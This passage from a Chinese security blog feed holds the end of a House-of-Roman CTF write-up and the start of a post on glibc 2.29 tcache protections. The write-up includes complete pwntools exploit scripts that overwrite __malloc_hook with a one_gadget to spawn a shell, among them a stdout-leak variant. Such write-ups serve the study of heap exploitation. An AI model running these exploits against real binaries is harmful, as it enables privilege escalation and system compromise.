get_str((__int64)&amp;s, 15);</span><br><span class="line">    v6 = atoi(&amp;s);</span><br><span class="line">    if ( v5 == 2 ) // show</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;No way&quot;);</span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v5 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v5 == 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        remove(v6);</span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br><span class="line">      if ( v5 == 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        edit(v6);</span><br><span class="line">        continue;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v5 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      add(v6);</span><br><span class="line">      continue;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Invalid option!\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序菜单：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.alloc</span><br><span class="line">2.show</span><br><span class="line">3.free</span><br><span class="line">4.edit</span><br><span class="line">5.exit</span><br></pre></td></tr></table></figure></p><p>虽然菜单里面有show，然而是用不了的。跟上一题类似，有alloc，free，edit的功能，没有打印信息的函数。</p><p>漏洞一：free之后没有清空指针，存在double free。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall remove(unsigned int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line"></span><br><span class="line">  if ( a1 &lt;= 0xFF )</span><br><span class="line">  &#123;</span><br><span class="line">    free((void *)qword_4060[a1]);</span><br><span class="line">    result = puts(&quot;Done!\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>漏洞二：edit的时候，输入长度由用户输入决定，直接就是一个堆溢出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall edit(unsigned int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // ST1C_4</span><br><span class="line">  char nptr; // [rsp+20h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v4; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  if ( a1 &lt;= 0xFF &amp;&amp; qword_4060[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Size: &quot;);</span><br><span class="line">    get_str((__int64)&amp;nptr, 16);</span><br><span class="line">    v1 = atoi(&amp;nptr);</span><br><span class="line">    printf(&quot;Content: &quot;, 16LL);</span><br><span class="line">    get_str(qword_4060[a1], v1);</span><br><span class="line">    puts(&quot;Done!\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>另外本题alloc时大小可控，没有限制，相比上一题难度低不少。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall add(unsigned int a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t size; // [rsp+1Ch] [rbp-24h]</span><br><span class="line">  unsigned __int64 v3; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  if ( a1 &lt;= 0xFF )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Size: &quot;);</span><br><span class="line">    get_str((__int64)&amp;size + 4, 16);</span><br><span class="line">    LODWORD(size) = atoi((const char *)&amp;size + 4);</span><br><span class="line">    qword_4060[a1] = malloc((unsigned int)size);</span><br><span class="line">    if ( !qword_4060[a1] )</span><br><span class="line">      exit(0);</span><br><span class="line">    puts(&quot;Done!\n&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由于本题的漏洞时堆溢出，因此有部分攻击过程会比上题简单一点。第一步同样是通过修改chunk的size进行overlapping，制造重叠的chunk。唯一不同的地方是，进行修改的fastbin的fd和修复fastbin size为0x71的步骤，可以通过一次edit完成。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xe1</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x22</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x71</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">alloc(<span class="number">5</span>,<span class="number">0x60</span>) <span class="comment"># __malloc_hook</span></span><br></pre></td></tr></table></figure></p><p>这题也没有限制malloc大小，可以直接申请大于0x70大小的chunk，因此修复fastbin链的步骤也可以跳过。上一个步骤是直接使用堆溢出来修改fd，没有申请chunk，制造重叠chunk进行edit，此时unsortdbin的位置没有变动。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0xab7cebee20000000</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x56160694b020 —▸ 0x7fab7d1fdaed (_IO_wide_data_0+301) ◂— 0xab7cebee20000000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure></p><p>继续对0号chunk进行堆溢出就可以修改unsortedbin的BK，注意需要把chunk size修复为0xe1。这里我没有使用double free触发报错，直接调用malloc就成功getshell。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">0x22</span>+<span class="number">8</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xe1</span>,<span class="number">0</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span>)[:<span class="number">2</span>])</span><br><span class="line">alloc(<span class="number">6</span>,<span class="number">0xd0</span>) <span class="comment"># unsorted bins</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0xf1147</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x16</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one_gadget)[:<span class="number">3</span>])<span class="comment">#5cf147 ba1147</span></span><br><span class="line">alloc(<span class="number">8</span>,<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure></p><p>完整EXP：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">'Index: '</span>,str(idx))</span><br><span class="line">        p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">'Index: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">'Index: '</span>,str(idx))</span><br><span class="line">        p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line">        p.sendafter(<span class="string">'Content: '</span>,content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># house of roman</span></span><br><span class="line">    libc.address = <span class="number">0x233000</span></span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x20</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xe1</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># fastbin attack</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x22</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x71</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)[:<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">5</span>,<span class="number">0x60</span>) <span class="comment"># __malloc_hook</span></span><br><span class="line">    <span class="comment"># unsortedbin attack</span></span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x22</span>+<span class="number">8</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xe1</span>,<span class="number">0</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x10</span>)[:<span class="number">2</span>])</span><br><span class="line">    alloc(<span class="number">6</span>,<span class="number">0xd0</span>) <span class="comment"># unsorted bins</span></span><br><span class="line">    <span class="comment">#one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]</span></span><br><span class="line">    one_gadget = libc.address + <span class="number">0xf1147</span></span><br><span class="line">    edit(<span class="number">5</span>,<span class="number">0x16</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(one_gadget)[:<span class="number">3</span>])<span class="comment">#5cf147 ba1147</span></span><br><span class="line">    alloc(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></p><p>这题比护网杯的简单，不过核心的思路仍然是fastbin attack和unsortedbin attack。</p><h2 id="更多思考"><a href="#更多思考" class="headerlink" title="更多思考"></a>更多思考</h2><p>重新打开ASLR进行测试exp时，脸黑的兄弟会发现跑了很久很久都不成功，因为House-Of-Roman成功率实在有点感人，虽然大幅度降低了爆破的范围，仍然需要爆破12bit，也就是1/4096的成功率。今年各大比赛见过不少没有打印功能的题目，却鲜有人提及House-Of-Roman，为何？</p><p>原因很简单，因为有更好更稳定的攻击手段，就是修改<code>IO_FILE</code>结构体进行地址泄漏。以第二题fkroman为例，在第一步进行fastbin attack时，将fd修改至stdout附近，然后修改stdout结构体，即可泄漏libc地址，后面修改<code>__malloc_hook</code>就无需进行低地址写爆破，将成功率提高到1/16，非洲人福音。</p><p><code>_IO_2_1_stdout_</code>泄露地址的方法看其他大佬的文章，这里不展开说了，可以参考：<a href="https://xz.aliyun.com/t/5057" target="_blank" rel="noopener">https://xz.aliyun.com/t/5057</a></p><p>fkroman的exp可修改为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">'Index: '</span>,str(idx))</span><br><span class="line">        p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">'Index: '</span>,str(idx))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">        p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">'Index: '</span>,str(idx))</span><br><span class="line">        p.sendlineafter(<span class="string">'Size: '</span>,str(size))</span><br><span class="line">        p.sendafter(<span class="string">'Content: '</span>,content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    alloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    alloc(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x20</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0xe1</span>)) </span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x22</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x71</span>)+p16(<span class="number">0x65dd</span>))</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">5</span>,<span class="number">0x54</span>,<span class="string">'a'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad2887</span>|<span class="number">0x1000</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>) </span><br><span class="line">    libc.address = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'_IO_2_1_stderr_'</span>] - <span class="number">192</span></span><br><span class="line">    success(hex(libc.address))</span><br><span class="line">    </span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    edit(<span class="number">2</span>,<span class="number">0x8</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    alloc(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">    alloc(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">7</span>,<span class="number">0x1b</span>,<span class="string">'a'</span>*<span class="number">0x13</span>+p64(libc.address+<span class="number">0xf1147</span>))</span><br><span class="line">    alloc(<span class="number">8</span>,<span class="number">0x60</span>)</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></p><p>用这个exp的成功率大大提升，各位非洲人可以试试。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191012140522-4677f8ec-ecb6-1.png" alt="image.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>House-Of-Roman的攻击思路很值得学习，不过改修改<code>IO_FILE</code>结构体的方法成功率更高，本地测试基本秒出，正常情况下还是优先考虑用此方法。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_roman-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_roman-zh/</a></p><p><a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="noopener">https://github.com/romanking98/House-Of-Roman</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-Of-Roman学习笔记&quot;&gt;&lt;a href=&quot;#House-Of-Roman学习笔记&quot; class=&quot;headerlink&quot; title=&quot;House-Of-Roman学习笔记&quot;&gt;&lt;/a&gt;House-Of-Roman学习笔记&lt;/h1&gt;&lt;p&gt;本文首发于：
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>tcache poisoning在glibc2.29中的利用小结</title>
    <link href="https://4f-kira.github.io/2020/03/20/glibc2-29-tcache/"/>
    <id>https://4f-kira.github.io/2020/03/20/glibc2-29-tcache/</id>
    <published>2020-03-20T07:40:19.000Z</published>
    <updated>2020-03-20T07:41:46.796Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tcache-poisoning在glibc2-29中的利用小结"><a href="#tcache-poisoning在glibc2-29中的利用小结" class="headerlink" title="tcache poisoning在glibc2.29中的利用小结"></a>tcache poisoning在glibc2.29中的利用小结</h1><p>本文首发于：<a href="https://xz.aliyun.com/t/7292" target="_blank" rel="noopener">https://xz.aliyun.com/t/7292</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在练习渗透，万万没想到做渗透还是遇上了pwn，提权过程发现一个有suid的二进制程序，程序的漏洞比较明显，唯一难点是程序使用的libc版本较高，为glibc2.29，这么高版本的libc还没了解过，借此机会学一下2.29libc新增的保护机制，以及如何绕过新增的保护，使用tcache进行攻击。</p><h2 id="Glibc-2-29-tcache新增防护机制"><a href="#Glibc-2-29-tcache新增防护机制" class="headerlink" title="Glibc-2.29 tcache新增防护机制"></a>Glibc-2.29 tcache新增防护机制</h2><p>tcache是glibc-2.26引入的一种新技术，目的是提升堆管理的性能，早期的libc对tcache基本没任何防护，简直到了为所欲为的地步，一不检查double free，二不检查size大小，使用起来比fastbins还要简单。</p><p>查看glibc-2.29 malloc.c的源码，tcache_entry结构体增加了一个新指针<code>key</code>放在bk的位置，用于检测double free。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">  /* This field exists to detect double frees.  */</span><br><span class="line">  struct tcache_perthread_struct *key; /* 新增指针 */</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p>在之前的版本，要填满tcache非常简单粗暴，如果程序不清空指针，可以由头到尾free同一个chunk，直接把tcache填满，在2.29下这个方法不再适用。下面继续看一下<code>tcache_put</code>和<code>tcache_get</code>部分的源码，看看这个新指针起到如何的作用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">/* Caller must ensure that we know tc_idx is valid and there&apos;s room</span><br><span class="line">   for more chunks.  */</span><br><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="line">     detect a double free.  */</span><br><span class="line">  e-&gt;key = tcache;   // 写入tcache_perthread_struct地址</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Caller must ensure that we know tc_idx is valid and there&apos;s</span><br><span class="line">   available chunks to remove.  */</span><br><span class="line">static __always_inline void *</span><br><span class="line">tcache_get (size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;counts[tc_idx] &gt; 0);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = NULL;  // 清空</span><br><span class="line">  return (void *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当一个属于tcache大小的chunk被free掉时，会调用<code>tcache_put</code>，<code>e-&gt;key</code>被写入<code>tcache_perthread_struct</code>的地址，也就是heap开头的位置。而当程序从tcache取出chunk时，会将<code>e-&gt;key</code>重新清空。简单的调试看看实际的运行结果，下图为一个0x60大小的chunk，bk位置写入了一个<code>tcache_perthread_struct</code>的地址。</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200226143913-b389fecc-5862-1.png" alt="image.png"></p><p>然后再看一下<code>_int_free</code>中<code>tcache</code>部分如何进行double free检测。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">_int_free (mstate av, mchunkptr p, int have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        /* its size */</span><br><span class="line">  mfastbinptr *fb;             /* associated fastbin */</span><br><span class="line">  mchunkptr nextchunk;         /* next contiguous chunk */</span><br><span class="line">  INTERNAL_SIZE_T nextsize;    /* its size */</span><br><span class="line">  int nextinuse;               /* true if nextchunk is used */</span><br><span class="line">  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */</span><br><span class="line">  mchunkptr bck;               /* misc temp for linking */</span><br><span class="line">  mchunkptr fwd;               /* misc temp for linking */</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  &#123;</span><br><span class="line">    size_t tc_idx = csize2tidx (size);</span><br><span class="line">    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">/* Check to see if it&apos;s already in the tcache.  */</span><br><span class="line">tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">/* This test succeeds on double free.  However, we don&apos;t 100%</span><br><span class="line">   trust it (it also matches random payload data at a 1 in</span><br><span class="line">   2^&lt;size_t&gt; chance), so verify it&apos;s not an unlikely</span><br><span class="line">   coincidence before aborting.  */</span><br><span class="line">if (__glibc_unlikely (e-&gt;key == tcache)) // 检查是否为tcache_perthread_struct地址</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);</span><br><span class="line">    for (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      if (tmp == e)                      // 检查tcache中是否有一样的chunk</span><br><span class="line">malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);</span><br><span class="line">    /* If we get here, it was a coincidence.  We&apos;ve wasted a</span><br><span class="line">       few cycles, but don&apos;t abort.  */</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></p><p>首先<code>_int_free</code>会检查chunk的key是否为tcache_perthread_struct地址，然后会遍历tcache，检查此chunk是否已经在tcache中，如有则触发<code>malloc_printerr</code>报错<code>free(): double free detected in tcache 2</code>。</p><p>简单总结一下，2.29下tcache触发double free报错的条件为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-key == &amp;tcache_perthread_struct &amp;&amp; chunk in tcachebin[chunk_idx]</span><br></pre></td></tr></table></figure></p><p>新增保护主要还是用到<code>e-&gt;key</code>这个属性，因此绕过想绕过检测进行double 